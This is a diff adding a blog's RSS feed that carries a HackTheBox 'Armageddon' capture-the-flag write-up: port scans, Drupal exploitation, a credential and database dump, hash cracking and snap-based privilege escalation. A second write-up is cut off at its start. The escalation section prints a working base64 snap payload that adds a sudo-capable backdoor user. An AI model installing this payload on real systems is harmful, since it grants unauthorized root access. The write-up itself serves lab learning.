@@ -1,0 +1,285 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Easy on ybenel</title>
+    <link>https://ybenel.cf/tags/easy/</link>
+    <description>ybenel (Easy)</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 27 Mar 2021 00:00:00 +0000</lastBuildDate>
+    
+    <atom:link href="https://ybenel.cf/tags/easy/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>HTB - Armageddon</title>
+      <link>https://ybenel.cf/post/htb-armageddon/</link>
+      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ybenel.cf/post/htb-armageddon/</guid>
+      <description>&lt;p&gt;Armageddon Easy Box By bertolis, that consists of basic identification of old unpatched web framework that is vulnerable to a remote code execution exploit, and little enumeration and database dump with password cracking and the wrong use of sudo permissions (terms).&lt;/p&gt;
+&lt;h2 id=&#34;enumeration&#34; &gt;Enumeration
+&lt;span&gt;
+    &lt;a href=&#34;#enumeration&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;We start of with an intense full port scan with nmap.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:47:39 2021 as: nmap -p- --min-rate 10000 -v -oN full_port.nmap 10.129.100.170&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Increasing send delay &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.100.170 from &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; to &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; due to &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; out of &lt;span style=&#34;color:#ae81ff&#34;&gt;183&lt;/span&gt; dropped probes since last increase.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Warning: 10.129.100.170 giving up on port because retransmission cap hit &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Increasing send delay &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.100.170 from &lt;span style=&#34;color:#ae81ff&#34;&gt;640&lt;/span&gt; to &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt; due to &lt;span style=&#34;color:#ae81ff&#34;&gt;110&lt;/span&gt; out of &lt;span style=&#34;color:#ae81ff&#34;&gt;366&lt;/span&gt; dropped probes since last increase.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; armageddon.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.129.100.170&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.098s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Not shown: &lt;span style=&#34;color:#ae81ff&#34;&gt;40576&lt;/span&gt; closed ports, &lt;span style=&#34;color:#ae81ff&#34;&gt;24958&lt;/span&gt; filtered ports
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Then we run another nmap scan to identify what version/service ports are running on.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nmap 7.91 scan initiated Sat Mar 27 16:48:56 2021 as: nmap -sC -sV -p80 -oN scan.nmap 10.129.100.170&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; armageddon.htb &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;10.129.100.170&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.070s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp open  http    Apache httpd 2.4.6 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;CentOS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; PHP/5.4.16&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-generator: Drupal &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;http://drupal.org&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| http-robots.txt: &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; disallowed entries &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; shown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /includes/ /misc/ /modules/ /profiles/ /scripts/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_/LICENSE.txt /MAINTAINERS.txt
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.6 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;CentOS&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; PHP/5.4.16
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Welcome to  Armageddon |  Armageddon
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Nmap Identifies Port 80 To be running drupal 7 which is an old version and possibly surfring from many RCE&amp;rsquo;s Exploits .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/exploits.png&#34; alt=&#34;searchsploit_exploits&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;foothold&#34; &gt;Foothold
+&lt;span&gt;
+    &lt;a href=&#34;#foothold&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;Checking Exploits that &lt;strong&gt;searchploit&lt;/strong&gt; showed and from the name of the box it looks like the drupal installation is highly vulnerable to Drupalgeddon2/3 , further tho running &lt;strong&gt;Metasploit&lt;/strong&gt; to launch the exploit.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/metasploit1.png&#34; alt=&#34;metasploit1&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;After Few Moments.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/msf_worked.png&#34; alt=&#34;msf_worked1&#34;&gt;&lt;/p&gt;
+&lt;h4 id=&#34;user-enumeration&#34; &gt;User Enumeration
+&lt;span&gt;
+    &lt;a href=&#34;#user-enumeration&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;After Getting A foothold on the machine i tried spawning another shell to get a full tty shell ,however the following error is giving .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/no_tty.png&#34; alt=&#34;no_revshell&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;This concludes that the there&amp;rsquo;s some sort of firewall blocking it or there&amp;rsquo;s restrictions that don&amp;rsquo;t allow such outcoming connections like sandboxed programs in this case apache?.&lt;/li&gt;
+&lt;li&gt;However there&amp;rsquo;s an allowed connection at port 4444&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/rev_shell.png&#34; alt=&#34;rev_shell&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Yet trying to spawn a tty results into another issue which confirms this a sandboxed environment .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/sandboxed.png&#34; alt=&#34;sandboxed_box&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Let&amp;rsquo;s get &lt;strong&gt;linpeas&lt;/strong&gt; and run it, PS: Since this is a restricted environment we cannot make files executable or get them with any port unless 80.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/linpeas.png&#34; alt=&#34;linpeas_start&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Linpeas did find drupal Mysql password&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/linpeas2.png&#34; alt=&#34;finding_mysql_creds&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Let&amp;rsquo;s check the full file [/var/www/html/sites/default/settings.php] for mysql username And Password.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/creds_mysql.png&#34; alt=&#34;creds_mysql&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Sweet , now let&amp;rsquo;s connect to mysql and dump what juicy stuff it holds .&lt;/li&gt;
+&lt;li&gt;Reminder, I had issues connecting to mysql directly with mysql client however i did a betterway to get the content of mysql database through mysqldump.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/mysql_dump.png&#34; alt=&#34;mysql_dump&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;now i can just download it and cat it or import it to my own mysql server.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/dump_view.png&#34; alt=&#34;dump_view&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;we can see that&amp;rsquo;s there&amp;rsquo;s the user &lt;strong&gt;brucetherealadmin&lt;/strong&gt; which is a local user , let&amp;rsquo;s crack its hash and try to ssh with it.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/crack_hash.png&#34; alt=&#34;brute_pass_crack&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Great it&amp;rsquo;s cracked , Now let&amp;rsquo;s try to ssh into &lt;strong&gt;Bruce&lt;/strong&gt; and read the &lt;strong&gt;user.txt&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/get_user.png&#34; alt=&#34;get_user&#34;&gt;&lt;/p&gt;
+&lt;h2 id=&#34;privilege-escalation&#34; &gt;Privilege Escalation
+&lt;span&gt;
+    &lt;a href=&#34;#privilege-escalation&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;h3 id=&#34;initial-recon&#34; &gt;Initial Recon
+&lt;span&gt;
+    &lt;a href=&#34;#initial-recon&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;After we got into user &lt;strong&gt;bruce&lt;/strong&gt; let&amp;rsquo;s see if he has any sudo permissions,terms whatever .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/sudo_int.png&#34; alt=&#34;sudo_terms&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Looks like he (&lt;strong&gt;bruce&lt;/strong&gt;) can install snap packages , This is really interesting .&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Let&amp;rsquo;s create a crafted snap package and install it simply it will be just a setuid binary packaged in snap that will get us root , otherway is by overwritten the content of /etc/passwd by adding a root user to it that will can ssh to &amp;hellip;. , there&amp;rsquo;s alot of way tho.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;There&amp;rsquo;s few exploits that were made for snapd that allowed installation of malicious crafted snaps , however we don&amp;rsquo;t need to run those exploits because this version of snap is patched and we have root privileges to install any snap package.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;So In Order To Create a snap package i had to install an ubuntu vm cuz i&amp;rsquo;m running arch based os, so i cheated a bit and i didn&amp;rsquo;t want to run a vm so i used a prepacked snaps from those exploits &lt;a href=&#34;https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py&#34;&gt;link&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;i decoded the base64 and wrote it to a file using python&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; base64
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERo
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;T2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawpl
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Y2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFt
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZv
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;ciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5n
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;L2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZt
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAe
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUj
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;rkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAA
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;AAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAA
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4256&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;==&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(payload)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;crafted.snap&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wb&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(d)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Then downloaded the file and installed it .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/inst_run.png&#34; alt=&#34;inst_run&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Now let&amp;rsquo;s su to the dirty_sock user we added to /etc/passwd and read the root flag.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://ybenel.cf/imgs/arma/read_root.png&#34; alt=&#34;read_root&#34;&gt;&lt;/p&gt;
+&lt;p&gt;And That&amp;rsquo;s it , that&amp;rsquo;s &lt;strong&gt;Armageddon&lt;/strong&gt; hope you enjoyed the writeup take care and i&amp;rsquo;ll see you all other time.&lt;/p&gt;</description>
+    </item>
+    
+    <item>
+      <title>HTB - Delivery</title>
+      <link>https://ybenel.cf/post/htb-delivery/</link>
+      <pubDate>Sun, 10 Jan 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://ybenel.cf/post/htb-delivery/</guid>
+      <description>&lt;p&gt;Delivery Easy Box By Ippsec&lt;/p&gt;
+&lt;h2 id=&#34;foothold&#34; &gt;Foothold
+&lt;span&gt;
+    &lt;a href=&#34;#foothold&#34;&gt;
+        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
+    &lt;/a&gt;
+&lt;/span&gt;
+&lt;/h2&gt;&lt;h3 id=&#34;enumeration&#34; &gt;Enumeration
+&lt;span&gt;
+    &lt;a href=&#34;#enumeration&#34;&gt;
